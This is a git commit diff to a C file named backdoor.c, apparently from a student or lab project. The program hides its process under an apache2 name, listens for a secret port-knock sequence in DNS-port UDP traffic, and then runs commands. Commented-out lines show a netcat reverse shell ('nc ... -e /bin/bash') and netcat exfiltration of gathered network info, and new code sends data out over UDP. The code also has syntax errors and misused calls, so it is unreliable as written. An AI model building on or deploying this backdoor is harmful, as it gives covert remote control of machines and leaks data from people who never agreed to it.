2ea1079e70e955efa8efff23be0d863c1d9ae904
Tim Kim <timkim@localhost.localdomain>
2015-05-25 21:28:07 -0700

    haha

--- src/backdoor.c
+++ src/backdoor.c
@@ -45,7 +45,18 @@
 #define MASK "/usr/sbin/apache2 -k start -DSSL"
 #define NIC "wlp3s0"
 
+#define DEST_ADDR "127.0.0.1"
+#define DEST_PORT "50000"
+
 unsigned char lock = 0b000;
+
+//Function Prototypes
+void mask_application(char *name);
+void check_lock(int addr, int port);
+void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
+void execute_backdoor(int addr, int port);
+int send_info(char buffer[]);
+
 /*-----------------------------------------------------------------------------------------------
 -- FUNCTION:   mask_application(char *name)
 --             name - 
@@ -66,10 +77,11 @@ void mask_application(char *name)
 	setgid(0);
 }
 
-void check_lock(char *addr, int port)
+void check_lock(int addr, int port)
 {
-	if(!((lock + 1) & ((1 << 3) - 1))))
+	if(!((lock + 1) & ((1 << 3) - 1))) {
 		execute_backdoor(addr, port);
+	}
 
 	//lock = 0;
 	//sleep(5);
@@ -90,17 +102,20 @@ void check_lock(char *addr, int port)
 void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 {
 	int size = header->len;
+	int guess;
 	unsigned short iphdrlen;
+	struct sockaddr_in source;
 
 	struct iphdr *iph = (struct iphdr*)(packet + sizeof(struct ethhdr));
 	iphdrlen = iph->ihl * 4;
 
 	struct udphdr *udph = (struct udphdr*)(packet + iphdrlen + sizeof(struct ethhdr));
 
+	source.sin_addr.s_addr = iph->saddr);
 
 	int sPort = ntohs(udph->source);
 	// make sure udp
-	/*if((iph->protocol == 17))
+	if((iph->protocol == 17))
 	{
 		int id = ntohs(iph->id);
 		int dPort = ntohs(udph->dest);
@@ -110,20 +125,21 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 		{
 			case R_KEY:
 				BIT_SET(lock, 0);
-				check_lock();
+				check_lock(iph->saddr, DEST_PORT);
 				break;
 			case G_KEY:
 				BIT_SET(lock, 1);
-				check_lock();
+				check_lock(iph->saddr, DEST_PORT);
 				break;
 			case B_KEY:
 				BIT_SET(lock, 2);
-				check_lock();
+				check_lock(iph->saddr, DEST_PORT);
 				break;
 			default:
 				break;
 		}
-	}*/
+	}
+	printf("%s\n", inet_ntoa(source.sin_addr));
 }
 
 
@@ -139,11 +155,61 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 --
 -- NOTES:      Process incoming packets to look for secret knock.
 --------------------------------------------------------------------------------------------------*/
-void execute_backdoor(char *addr, int port)
+void execute_backdoor(int addr, int port)
 {
+	char buffer[256];
+
 	printf("executing...\n");
 	// send shell to client
 	//system("nc %s %d -e /bin/bash", addr, port);
+	system("ifconfig << info.txt");
+	//system("nc %s %d -e < info.txt", addr, port);
+}
+
+int send_info(char buffer[])
+{
+	int sockfd, newsockfd, portno;
+	struct sockaddr_in dest;
+	struct hostent *server;
+
+	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+
+	if(sockfd < 0)
+	{
+	    fprintf(stderr, "Can't open socket\n");
+	    return 2;
+	}
+
+	server = DEST_ADDR;
+	portno = atoi(DEST_PORT);
+
+	bzero((char*) &dest, sizeof(dest));
+
+	dest.sin_family = AF_INET;
+	dest.sin_port = htons(portno);
+
+	if(inet_aton(server, &dest.sin_addr) == 0)
+	{
+	    fprintf(stderr, "Can't connect\n");
+	    return 2;
+	}
+	
+	if(bind(sockfd, (struct sockaddr*)&dest, sizeof(dest)) < 0)
+	{
+	    fprintf(stderr,"Can't bind socket\n");
+	    return 2;
+	}
+
+	newsockfd = sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&dest, sizeof(dest));
+	if(newsockfd < 0)
+	{
+	    fprintf(stderr,"Can't sendto\n");
+	    return 2;
+	}
+
+	close(sockfd);
+
+	return 0;
 }
 
 /*-----------------------------------------------------------------------------------------------
@@ -159,7 +225,7 @@ int main(int argc, char *argv[])
 {
 	char *dev;
 	char errbuf[PCAP_ERRBUF_SIZE];
-	char filter_exp[] = "port 53 and udp";  // filter expression
+	char filter_exp[] = "udp dst port 53";  // filter expression
 	const u_char *packet;
 
 	struct bpf_program fp;  // compiled filter expression
